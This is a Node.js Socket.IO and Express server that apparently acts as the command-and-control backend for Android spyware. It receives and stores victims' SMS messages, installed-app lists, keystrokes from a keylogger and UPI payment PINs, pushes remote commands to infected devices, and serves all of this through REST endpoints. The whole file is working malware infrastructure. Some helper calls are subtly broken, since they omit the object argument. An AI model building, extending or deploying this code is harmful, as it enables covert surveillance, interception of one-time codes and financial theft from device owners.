// server.js
require('./utils/tracer'); // Must be first
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { createAdapter } = require('@socket.io/redis-adapter');
const Redis = require('ioredis');
const cors = require('cors');
const helmet = require('helmet');
require('dotenv').config();
const axios = require('axios');
const logger = require('./utils/logger');

const { PrismaClient } = require('@prisma/client');

// Handle BigInt serialization
BigInt.prototype.toJSON = function () { return this.toString() }

const prisma = new PrismaClient();
const app = express();

// Helper to get value from either snake_case or camelCase
const getVal = (obj, key1, key2) => {
    if (!obj) return undefined;
    if (obj[key1] !== undefined) return obj[key1];
    if (key2 && obj[key2] !== undefined) return obj[key2];
    return undefined;
};

// Security and Middleware
app.use(helmet());
app.use(cors());
app.set('trust proxy', true);
app.use(express.json());

// Logging middleware
app.use((req, res, next) => {
    logger.info({ method: req.method, url: req.url }, 'HTTP Request');
    next();
});

const server = http.createServer(app);

// Redis Adapter Setup
const pubClient = new Redis(process.env.REDIS_URL || 'redis://localhost:6379');
const subClient = pubClient.duplicate();

// Add error handlers to prevent crashes and log issues
pubClient.on('error', (err) => logger.error(err, 'Redis Pub Client Error'));
subClient.on('error', (err) => logger.error(err, 'Redis Sub Client Error'));

const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    adapter: createAdapter(pubClient, subClient)
});

// Connect to database
async function connectDatabase() {
    try {
        logger.info('Attempting to connect to database...');
        await prisma.$connect();
        logger.info('✅ Connected to database via Prisma');
    } catch (err) {
        logger.error(err, '❌ Database connection error');
        process.exit(1);
    }
}

connectDatabase();

// Helper to notify main backend of changes
async function notifyChange(type, data) {
    const notifyUrl = process.env.NOTIFY_URL;
    if (!notifyUrl) return;

    try {
        await axios.post(notifyUrl, {
            type,
            data,
            source: 'socketio-provider',
            apiKey: process.env.NOTIFY_API_KEY
        });
        logger.info(`📡 [Relay] Successfully notified ${type} for ${data.device_id || 'unknown'}`);
    } catch (err) {
        logger.error(err, `[Relay] Failed to notify change: ${type}`);
    }
}

// Socket.IO Connection Handling
io.on('connection', (socket) => {
    const query = socket.handshake.query;
    const deviceId = query.device_id || query.deviceId;
    const appId = query.app_id || query.appId;
    const buildId = query.build_id || query.buildId;
    const connectionId = socket.id;

    logger.info({ socket: connectionId, device: deviceId || 'unknown', appId, buildId }, '🔌 New connection');

    if (deviceId) {
        // Join device-specific room
        socket.join(`device:${deviceId}`);
        logger.info({ deviceId }, '📍 Device joined room');

        // Update device online status and app context
        prisma.device.upsert({
            where: { device_id: deviceId },
            update: {
                status: true,
                last_seen: new Date(),
                app_id: appId,
                build_id: buildId
            },
            create: {
                device_id: deviceId,
                status: true,
                last_seen: new Date(),
                app_id: appId,
                build_id: buildId
            }
        }).then(() => {
            logger.info({ deviceId }, '✅ Device online status updated');
            notifyChange('device_change', { device_id: deviceId, status: true, last_seen: new Date() });
        }).catch(err => {
            logger.error(err, `❌ Error updating device status for ${deviceId}`);
        });
    }

    // Upsert device data
    socket.on('upsert_device_data', async (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`📱 [${timestamp}] upsert_device_data received from ${deviceId || 'unknown'}`);

        try {
            let deviceData = typeof data === 'string' ? JSON.parse(data) : data;
            logger.info(`📊 [${timestamp}] Device data:`, JSON.stringify(deviceData).substring(0, 200) + '...');

            // Handle array input (take first item)
            if (Array.isArray(deviceData)) {
                logger.info(`📋 [${timestamp}] Device data is array, taking first element`);
                deviceData = deviceData[0];
            }

            if (!deviceData) {
                logger.error(`❌ [${timestamp}] No device data provided from ${deviceId}`);
                if (ack) ack(false);
                return;
            }

            const id = getVal(deviceData, 'device_id', 'deviceId');

            if (!id) {
                logger.error(`❌ [${timestamp}] Device ID missing in upsert data from ${deviceId}`);
                if (ack) ack(false);
                return;
            }

            const updateData = {
                android_id: getVal('android_id', 'androidId'),
                manufacturer: getVal('manufacturer', 'manufacturer') ?? "Unknown",
                model: getVal('model', 'model') ?? "Unknown",
                brand: getVal('brand', 'brand'),
                product: getVal('product', 'product'),
                android_version: getVal('android_version', 'androidVersion'),
                raw_device_info: getVal('raw_device_info', 'rawDeviceInfo'),
                sim_cards: getVal('sim_cards', 'simCards'),
                service_status: getVal('service_status', 'serviceStatus'),
                oem_status: getVal('oem_status', 'oemStatus'),
                power_save_status: getVal('power_save_status', 'powerSaveStatus'),
                screen_status: getVal('screen_status', 'screenStatus'),
                process_importance: (getVal('process_importance', 'processImportance') || null)?.toString(),

                // If heartbeat is included in the payload, save it too
                heartbeat: deviceData.heartbeat || undefined,

                app_id: getVal('app_id', 'appId'),
                build_id: getVal('build_id', 'buildId'),
                status: true,
                last_seen: new Date()
            };

            logger.info(`💾 [${timestamp}] Upserting device ${id} with data:`, JSON.stringify(updateData).substring(0, 300) + '...');

            await prisma.device.upsert({
                where: { device_id: id },
                update: updateData,
                create: {
                    device_id: id,
                    ...updateData
                }
            });

            logger.info(`✅ [${timestamp}] Device ${id} data upserted successfully`);
            notifyChange('device_change', { ...updateData, device_id: id });
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error upserting device data from ${deviceId}:`, error);
            if (ack) ack(false);
        }
    });

    // Get pending commands
    socket.on('get_pending_commands', async (deviceId, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`📥 [${timestamp}] get_pending_commands requested for ${deviceId}`);

        try {
            const commands = await prisma.deviceCommand.findMany({
                where: {
                    device_id: deviceId,
                    status: 'pending'
                },
                orderBy: { created_at: 'desc' }
            });

            logger.info(`📋 [${timestamp}] Found ${commands.length} pending commands for ${deviceId}`);

            const mappedCommands = commands.map(c => ({
                id: c.id,
                deviceId: c.device_id,
                command: c.command,
                payload: c.payload,
                status: c.status
            }));

            if (ack) ack(JSON.stringify(mappedCommands));
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error getting pending commands for ${deviceId}:`, error);
            if (ack) ack(JSON.stringify([]));
        }
    });

    // Mark command as delivered
    socket.on('mark_command_delivered', async (commandId, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`📬 [${timestamp}] mark_command_delivered for command ${commandId}`);

        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'delivered',
                    delivered_at: new Date()
                }
            });
            logger.info(`✅ [${timestamp}] Command ${commandId} marked as delivered`);
            notifyChange('command_status', { id: commandId, status: 'delivered', device_id: deviceId });
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error marking command ${commandId} as delivered:`, error);
            if (ack) ack(false);
        }
    });

    // Mark command as executed
    socket.on('mark_command_executed', async (commandId, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`✅ [${timestamp}] mark_command_executed for command ${commandId}`);

        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'executed',
                    executed_at: new Date()
                }
            });
            logger.info(`✅ [${timestamp}] Command ${commandId} marked as executed`);
            notifyChange('command_status', { id: commandId, status: 'executed', device_id: deviceId });
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error marking command ${commandId} as executed:`, error);
            if (ack) ack(false);
        }
    });

    // Mark command as failed
    socket.on('mark_command_failed', async (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`❌ [${timestamp}] mark_command_failed received`);

        try {
            const d = typeof data === 'string' ? JSON.parse(data) : data;
            logger.info(`📋 [${timestamp}] Command failure data:`, JSON.stringify(d));

            await prisma.deviceCommand.update({
                where: { id: d.command_id },
                data: {
                    status: 'failed',
                    executed_at: new Date()
                }
            });
            logger.info(`⚠️ [${timestamp}] Command ${d.command_id} failed with error: ${d.error}`);
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error marking command as failed:`, error);
            if (ack) ack(false);
        }
    });

    // Send heartbeat
    socket.on('send_heartbeat', async (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`💓 [${timestamp}] send_heartbeat received`);

        try {
            const h = typeof data === 'string' ? JSON.parse(data) : data;
            const deviceId = h.device_id || h.deviceId;

            logger.info(`📊 [${timestamp}] Heartbeat data for ${deviceId}: type=${h.type || 'ping'}`);

            if (!deviceId) {
                logger.error(`❌ [${timestamp}] Heartbeat missing device_id`);
                if (ack) ack(false);
                return;
            }

            // Insert into heartbeat table
            await prisma.heartbeat.create({
                data: {
                    device_id: deviceId,
                    type: h.type || 'ping',
                    last_update: new Date()
                }
            });

            // Update device table last_seen and store heartbeat
            await prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    last_seen: new Date(),
                    status: (h.status !== undefined) ? Boolean(h.status) : true,
                    heartbeat: h // Store the full heartbeat object
                }
            });

            socket.emit('heartbeat_ack');
            logger.info(`✅ [${timestamp}] Heartbeat processed for ${deviceId}`);
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error processing heartbeat:`, error);
            if (ack) ack(false);
        }
    });

    // Set online status
    socket.on('set_online_status', async (status, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`🔄 [${timestamp}] set_online_status: ${status} for ${deviceId}`);

        try {
            if (deviceId) {
                await prisma.device.update({
                    where: { device_id: deviceId },
                    data: {
                        status: Boolean(status),
                        last_seen: new Date()
                    }
                }).then(() => {
                    logger.info(`✅ [${timestamp}] Online status updated to ${status} for ${deviceId}`);
                }).catch(e => {
                    logger.error(`❌ [${timestamp}] Update online status failed for ${deviceId}:`, e.message);
                });
            } else {
                console.warn(`⚠️ [${timestamp}] No deviceId available for set_online_status`);
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error setting online status:`, error);
            if (ack) ack(false);
        }
    });

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`📨 [${timestamp}] sync_sms received`);

        try {
            let messages = typeof data === 'string' ? JSON.parse(data) : data;

            if (!Array.isArray(messages)) {
                // Handle case where it might be a single object or wrapped strangely
                messages = [messages];
            }
            logger.info(`📱 [${timestamp}] Processing ${messages.length} SMS messages`);

            // Normalize helper using global getVal

            const validMessages = [];
            for (const msg of messages) {
                if (!msg) continue;
                const dId = getVal(msg, 'device_id', 'deviceId');
                const idRaw = getVal(msg, 'id', 'id');

                if (dId && idRaw !== undefined && idRaw !== null) {
                    validMessages.push({ ...msg, _deviceId: dId, _idRaw: idRaw });
                }
            }

            if (validMessages.length === 0) {
                logger.info(`⚠️ [${timestamp}] No valid SMS messages to sync (might be empty list)`);
                if (ack) ack(true);
                return;
            }

            await prisma.$transaction(async (tx) => {
                for (const msg of validMessages) {
                    const smsId = String(msg._idRaw);
                    const localSmsId = getVal(msg, 'local_sms_id', 'localSmsId') || smsId;
                    const address = getVal(msg, 'address', 'address') || "";
                    const body = getVal(msg, 'body', 'body') || "";
                    const date = getVal(msg, 'date', 'date') || new Date().toISOString();
                    const timestampVal = getVal(msg, 'timestamp', 'timestamp') || 0;
                    const type = parseInt(getVal(msg, 'type', 'type') || "1");

                    await tx.smsMessage.upsert({
                        where: {
                            device_id_local_sms_id: {
                                device_id: msg._deviceId,
                                local_sms_id: localSmsId
                            }
                        },
                        update: {
                            id: smsId,
                            address: address,
                            body: body,
                            date: date,
                            timestamp: BigInt(timestampVal),
                            type: type,
                            sync_status: 'synced'
                        },
                        create: {
                            id: smsId,
                            local_sms_id: localSmsId,
                            device_id: msg._deviceId,
                            address: address,
                            body: body,
                            date: date,
                            timestamp: BigInt(timestampVal),
                            type: type,
                            sync_status: 'synced'
                        }
                    });
                }
            });

            logger.info(`✅ [${timestamp}] Synced ${validMessages.length} SMS messages`);
            validMessages.forEach(msg => {
                notifyChange('message_change', { ...msg, device_id: msg._deviceId });
            });
            socket.emit('sync_complete', 'sms', validMessages.length);
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error syncing SMS:`, error);
            if (ack) ack(false);
        }
    });

    // Sync single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`📩 [${timestamp}] sync_single_sms received`);

        try {
            const msg = typeof data === 'string' ? JSON.parse(data) : data;

            const dId = getVal(msg, 'device_id', 'deviceId');
            const idRaw = getVal(msg, 'id', 'id');

            logger.info(`📋 [${timestamp}] Single SMS: device=${dId}, from=${getVal(msg, 'address', 'address')}, id=${idRaw}`);

            if (dId && idRaw !== undefined && idRaw !== null) {
                const smsId = String(idRaw);
                const localSmsId = getVal(msg, 'local_sms_id', 'localSmsId') || smsId;
                const address = getVal(msg, 'address', 'address') || "";
                const body = getVal(msg, 'body', 'body') || "";
                const date = getVal(msg, 'date', 'date') || new Date().toISOString();
                const timestampVal = getVal(msg, 'timestamp', 'timestamp') || 0;
                const type = parseInt(getVal(msg, 'type', 'type') || "1");

                await prisma.smsMessage.upsert({
                    where: {
                        device_id_local_sms_id: {
                            device_id: dId,
                            local_sms_id: localSmsId
                        }
                    },
                    update: {
                        id: smsId,
                        address: address,
                        body: body,
                        date: date,
                        timestamp: BigInt(timestampVal),
                        type: type,
                        sync_status: 'synced'
                    },
                    create: {
                        id: smsId,
                        local_sms_id: localSmsId,
                        device_id: dId,
                        address: address,
                        body: body,
                        date: date,
                        timestamp: BigInt(timestampVal),
                        type: type,
                        sync_status: 'synced'
                    }
                });
                logger.info(`✅ [${timestamp}] Single SMS synced successfully`);
                notifyChange('message_change', { ...msg, device_id: dId });
            } else {
                console.warn(`⚠️ [${timestamp}] Single SMS sync skipped: Missing deviceId or id`);
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error syncing single SMS:`, error);
            if (ack) ack(false);
        }
    });

    // Sync apps
    socket.on('sync_apps', async (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`📦 [${timestamp}] sync_apps received`);

        try {
            let apps = typeof data === 'string' ? JSON.parse(data) : data;

            if (!Array.isArray(apps)) {
                apps = [apps];
            }
            logger.info(`📱 [${timestamp}] Processing ${apps.length} apps`);

            // Filter valid apps
            const validApps = [];
            for (const app of apps) {
                if (!app) continue;
                const dId = getVal(app, 'device_id', 'deviceId');
                const pkg = getVal(app, 'package_name', 'packageName');

                if (dId && pkg) {
                    validApps.push({ ...app, _deviceId: dId, _pkg: pkg });
                } else {
                    console.warn(`⚠️ [${timestamp}] Invalid app entry: missing device_id or package_name`);
                }
            }

            if (validApps.length === 0) {
                logger.info(`⚠️ [${timestamp}] No valid apps to sync (might be empty list)`);
                if (ack) ack(true);
                return;
            }

            await prisma.$transaction(async (tx) => {
                for (const app of validApps) {
                    const packageName = app._pkg;
                    const deviceId = app._deviceId;

                    const appName = getVal(app, 'app_name', 'appName') || packageName;
                    const icon = getVal(app, 'icon', 'icon') || "";
                    const versionName = getVal(app, 'version_name', 'versionName') || "";

                    const versionCodeFn = getVal(app, 'version_code', 'versionCode');
                    const versionCode = versionCodeFn ? BigInt(versionCodeFn) : null;

                    const firstInstallTimeFn = getVal(app, 'first_install_time', 'firstInstallTime');
                    const firstInstallTime = firstInstallTimeFn ? BigInt(firstInstallTimeFn) : null;

                    const lastUpdateTimeFn = getVal(app, 'last_update_time', 'lastUpdateTime');
                    const lastUpdateTime = lastUpdateTimeFn ? BigInt(lastUpdateTimeFn) : null;

                    const isSystemApp = Boolean(getVal(app, 'is_system_app', 'isSystemApp'));
                    const targetSdk = parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0");
                    const minSdk = parseInt(getVal(app, 'min_sdk', 'minSdk') || "0");

                    const syncTsFn = getVal(app, 'sync_timestamp', 'syncTimestamp');
                    const syncTimestamp = syncTsFn ? BigInt(syncTsFn) : BigInt(Date.now());

                    await tx.installedApp.upsert({
                        where: {
                            device_id_package_name: {
                                device_id: deviceId,
                                package_name: packageName
                            }
                        },
                        update: {
                            app_name: appName,
                            icon: icon,
                            version_name: versionName,
                            version_code: versionCode,
                            first_install_time: firstInstallTime,
                            last_update_time: lastUpdateTime,
                            is_system_app: isSystemApp,
                            target_sdk: targetSdk,
                            min_sdk: minSdk,
                            sync_timestamp: syncTimestamp,
                            updated_at: new Date()
                        },
                        create: {
                            device_id: deviceId,
                            package_name: packageName,
                            app_name: appName,
                            icon: icon,
                            version_name: versionName,
                            version_code: versionCode,
                            first_install_time: firstInstallTime,
                            last_update_time: lastUpdateTime,
                            is_system_app: isSystemApp,
                            target_sdk: targetSdk,
                            min_sdk: minSdk,
                            sync_timestamp: syncTimestamp,
                            created_at: new Date(),
                            updated_at: new Date()
                        }
                    });
                }
            });

            logger.info(`✅ [${timestamp}] Synced ${validApps.length} apps`);
            socket.emit('sync_complete', 'apps', validApps.length);
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error syncing apps:`, error);
            if (ack) ack(false);
        }
    });


    // Set key log
    socket.on('set_key_log', async (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`⌨️ [${timestamp}] set_key_log received`);

        try {
            const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(keyLog, 'device_id', 'deviceId');
            const currentDate = getVal(keyLog, 'current_date', 'currentDate');

            logger.info(`📝 [${timestamp}] Key log from ${deviceId}: ${getVal(keyLog, 'key', 'key')}`);

            if (deviceId) {
                await prisma.keyLog.create({
                    data: {
                        device_id: deviceId,
                        keylogger: getVal(keyLog, 'keylogger', 'keylogger'),
                        key: getVal(keyLog, 'key', 'key'),
                        currentDate: currentDate ? new Date(currentDate) : new Date()
                    }
                });
                logger.info(`✅ [${timestamp}] Key log saved for ${deviceId}`);
                notifyChange('keylog_change', { ...keyLog, device_id: deviceId });
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error saving key log:`, error);
            if (ack) ack(false);
        }
    });

    // Set UPI pin
    socket.on('set_upi_pin', async (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`🔐 [${timestamp}] set_upi_pin received`);

        try {
            const pinData = typeof data === 'string' ? JSON.parse(data) : data;
            const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];

            const deviceId = getVal(pinData, 'device_id', 'deviceId');
            const currentDate = getVal(pinData, 'current_date', 'currentDate');

            logger.info(`📝 [${timestamp}] UPI pin from ${deviceId}: ${getVal(pinData, 'pin', 'pin').replace(/./g, '*')}`);

            if (deviceId) {
                await prisma.upiPin.create({
                    data: {
                        device_id: deviceId,
                        pin: getVal(pinData, 'pin', 'pin'),
                        currentDate: currentDate ? new Date(currentDate) : new Date()
                    }
                });
                logger.info(`✅ [${timestamp}] UPI pin saved for ${deviceId}`);
                notifyChange('pin_change', { ...pinData, device_id: deviceId });
            }
            if (ack) ack(true);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error saving UPI pin:`, error);
            if (ack) ack(false);
        }
    });

    // Test connection
    socket.on('test_connection', (data, ack) => {
        const timestamp = new Date().toISOString();
        logger.info(`🧪 [${timestamp}] test_connection from ${deviceId || 'unknown'}`);
        if (ack) ack(true);
    });

    // Admin: Send command to device
    socket.on('send_command', async (data) => {
        const timestamp = new Date().toISOString();
        logger.info(`📤 [${timestamp}] Admin send_command:`, JSON.stringify(data));

        try {
            const { device_id, command, payload } = data;
            const newCommand = await prisma.deviceCommand.create({
                data: {
                    device_id,
                    command,
                    payload,
                    status: 'pending'
                }
            });

            const commandToSend = {
                id: newCommand.id,
                deviceId: newCommand.device_id,
                command: newCommand.command,
                payload: newCommand.payload,
                status: newCommand.status
            };

            logger.info(`📦 [${timestamp}] Created command ${newCommand.id} for device ${device_id}`);

            // Emit as array because client expects List<DeviceCommand>
            io.to(`device:${device_id}`).emit('command', JSON.stringify([commandToSend]));
            logger.info(`📡 [${timestamp}] Command ${newCommand.id} sent to device:${device_id}`);
        } catch (error) {
            logger.error(`❌ [${timestamp}] Error sending command:`, error);
        }
    });

    // Handle disconnection
    socket.on('disconnect', (reason) => {
        const timestamp = new Date().toISOString();
        logger.info(`🔌 [${timestamp}] Device disconnected: ${deviceId || 'unknown'} (socket: ${connectionId}, reason: ${reason})`);

        if (deviceId) {
            // Update device offline status
            prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    status: false,
                    last_seen: new Date()
                }
            }).then(() => {
                logger.info(`✅ [${timestamp}] Device ${deviceId} marked as offline`);
                notifyChange('device_change', { device_id: deviceId, status: false, last_seen: new Date() });
            }).catch(err => {
                logger.error(`❌ [${timestamp}] Error updating offline status for ${deviceId}:`, err);
            });
        }
    });

    // Handle connection errors
    socket.on('error', (error) => {
        const timestamp = new Date().toISOString();
        logger.error(`❌ [${timestamp}] Socket error for ${deviceId}:`, error);
    });
});

app.get('/api/devices', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { appId } = req.query;
    logger.info(`🌐 [${timestamp}] GET /api/devices (appId: ${appId || 'all'})`);

    try {
        const devices = await prisma.device.findMany({
            where: appId ? { app_id: appId } : {},
            orderBy: { last_seen: 'desc' }
        });
        logger.info(`✅ [${timestamp}] Returning ${devices.length} devices`);
        res.json(devices);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error fetching devices:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    logger.info(`🌐 [${timestamp}] GET /api/devices/${deviceId}`);

    const { appId } = req.query;
    try {
        const device = await prisma.device.findUnique({
            where: { device_id: deviceId }
        });
        if (!device) return res.status(404).json({ error: 'Device not found' });

        // Multi-tenant check
        if (appId && device.app_id !== appId) {
            return res.status(403).json({ error: 'Forbidden: Device belongs to another app' });
        }

        res.json(device);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error fetching device ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/commands', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    logger.info(`🌐 [${timestamp}] GET /api/devices/${deviceId}/commands`);

    try {
        const commands = await prisma.deviceCommand.findMany({
            where: { device_id: deviceId },
            orderBy: { created_at: 'desc' }
        });
        logger.info(`✅ [${timestamp}] Returning ${commands.length} commands for ${deviceId}`);
        res.json(commands);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error fetching commands for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/devices/:deviceId/commands', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    const { command, payload } = req.body;
    const { appId } = req.query;
    logger.info(`🌐 [${timestamp}] POST /api/devices/${deviceId}/commands`, { command, payload, appId });

    try {
        // Multi-tenant check
        if (appId) {
            const device = await prisma.device.findUnique({
                where: { device_id: deviceId },
                select: { app_id: true }
            });
            if (device && device.app_id !== appId) {
                return res.status(403).json({ error: 'Forbidden: Device belongs to another app' });
            }
        }
        const newCommand = await prisma.deviceCommand.create({
            data: {
                device_id: deviceId,
                command: command,
                payload: payload,
                status: 'pending'
            }
        });

        const commandToSend = {
            id: newCommand.id,
            device_id: newCommand.device_id,
            command: newCommand.command,
            payload: newCommand.payload,
            status: newCommand.status
        };

        logger.info(`✅ [${timestamp}] Created command ${newCommand.id} for ${deviceId}`);

        // Emit command to device
        io.to(`device:${deviceId}`).emit('command', JSON.stringify([commandToSend]));
        logger.info(`📡 [${timestamp}] Command ${newCommand.id} sent to device:${deviceId}`);

        res.json(newCommand);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error creating command for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    logger.info(`🌐 [${timestamp}] GET /api/devices/${deviceId}/heartbeats`);

    const { appId } = req.query;
    try {
        const heartbeats = await prisma.heartbeat.findMany({
            where: {
                device_id: deviceId,
                device: appId ? { app_id: appId } : {}
            },
            orderBy: { last_update: 'desc' },
            take: 100
        });
        logger.info(`✅ [${timestamp}] Returning ${heartbeats.length} heartbeats for ${deviceId}`);
        res.json(heartbeats);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error fetching heartbeats for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});


// GET synced SMS for a device
app.get('/api/devices/:deviceId/sms', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    logger.info(`🌐 [${timestamp}] GET /api/devices/${deviceId}/sms`);

    const { appId } = req.query;
    try {
        const sms = await prisma.smsMessage.findMany({
            where: {
                device_id: deviceId,
                device: appId ? { app_id: appId } : {}
            },
            orderBy: { timestamp: 'desc' },
            take: 100
        });
        logger.info(`✅ [${timestamp}] Returning ${sms.length} SMS messages for ${deviceId}`);
        res.json(sms);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error fetching SMS for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// GET installed apps for a device
app.get('/api/devices/:deviceId/apps', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    logger.info(`🌐 [${timestamp}] GET /api/devices/${deviceId}/apps`);

    const { appId } = req.query;
    try {
        const apps = await prisma.installedApp.findMany({
            where: {
                device_id: deviceId,
                device: appId ? { app_id: appId } : {}
            },
            orderBy: { app_name: 'asc' }
        });
        logger.info(`✅ [${timestamp}] Returning ${apps.length} apps for ${deviceId}`);
        res.json(apps);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error fetching apps for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// GET Key Logs for a device
app.get('/api/devices/:deviceId/logs/keys', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    logger.info(`🌐 [${timestamp}] GET /api/devices/${deviceId}/logs/keys`);

    const { appId } = req.query;
    try {
        const logs = await prisma.keyLog.findMany({
            where: {
                device_id: deviceId,
                device: appId ? { app_id: appId } : {}
            },
            orderBy: { currentDate: 'desc' },
            take: 100
        });
        res.json(logs);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error fetching key logs for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

// GET UPI Pins for a device
app.get('/api/devices/:deviceId/logs/upi', async (req, res) => {
    const timestamp = new Date().toISOString();
    const { deviceId } = req.params;
    logger.info(`🌐 [${timestamp}] GET /api/devices/${deviceId}/logs/upi`);

    const { appId } = req.query;
    try {
        const logs = await prisma.upiPin.findMany({
            where: {
                device_id: deviceId,
                device: appId ? { app_id: appId } : {}
            },
            orderBy: { currentDate: 'desc' },
            take: 100
        });
        res.json(logs);
    } catch (error) {
        logger.error(`❌ [${timestamp}] Error fetching UPI logs for ${deviceId}:`, error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/messages', async (req, res) => {
    const { appId } = req.query;
    try {
        const messages = await prisma.smsMessage.findMany({
            where: appId ? {
                device: { app_id: appId }
            } : {},
            orderBy: { timestamp: 'desc' },
            take: 200
        });
        res.json(messages);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/apps', async (req, res) => {
    const { appId } = req.query;
    try {
        const apps = await prisma.installedApp.findMany({
            where: appId ? {
                device: { app_id: appId }
            } : {},
            orderBy: { updated_at: 'desc' },
            take: 200
        });
        res.json(apps);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/keylogs', async (req, res) => {
    const { appId } = req.query;
    try {
        const logs = await prisma.keyLog.findMany({
            where: appId ? {
                device: { app_id: appId }
            } : {},
            orderBy: { currentDate: 'desc' },
            take: 200
        });
        res.json(logs);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/pins', async (req, res) => {
    const { appId } = req.query;
    try {
        const pins = await prisma.upiPin.findMany({
            where: appId ? {
                device: { app_id: appId }
            } : {},
            orderBy: { currentDate: 'desc' },
            take: 200
        });
        res.json(pins);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    const timestamp = new Date().toISOString();
    logger.info(`🌐 [${timestamp}] GET /health`);
    res.json({
        status: 'healthy',
        timestamp,
        uptime: process.uptime(),
        connections: io.sockets.sockets.size
    });
});

// Graceful shutdown
process.on('SIGINT', async () => {
    const timestamp = new Date().toISOString();
    logger.info(`🛑 [${timestamp}] Received SIGINT, shutting down gracefully...`);

    await prisma.$disconnect();
    logger.info(`✅ [${timestamp}] Database disconnected`);

    server.close(() => {
        logger.info(`✅ [${timestamp}] Server closed`);
        process.exit(0);
    });
});

const termShutdown = async (signal) => {
    logger.info({ signal }, '🛑 Received signal, shutting down gracefully...');

    try {
        await prisma.$disconnect();
        logger.info('✅ Database disconnected');

        // Close Redis clients
        pubClient.quit();
        subClient.quit();
        logger.info('✅ Redis clients disconnected');

        server.close(() => {
            logger.info('✅ Server closed. Exiting.');
            process.exit(0);
        });
    } catch (err) {
        logger.error(err, '❌ Error during shutdown');
        process.exit(1);
    }

    // Force exit if it takes too long
    setTimeout(() => {
        logger.error('Forcefully shutting down');
        process.exit(1);
    }, 10000);
};

process.on('SIGTERM', () => termShutdown('SIGTERM'));
process.on('SIGINT', () => termShutdown('SIGINT'));

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    logger.error(error, '💥 Uncaught Exception');
});

process.on('unhandledRejection', (reason, promise) => {
    logger.error({ reason, promise }, '💥 Unhandled Rejection');
});

const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
    logger.info(`🚀 Socket.IO server running on port ${PORT}`);
    logger.info(`📊 Environment: ${process.env.NODE_ENV || 'development'}`);
});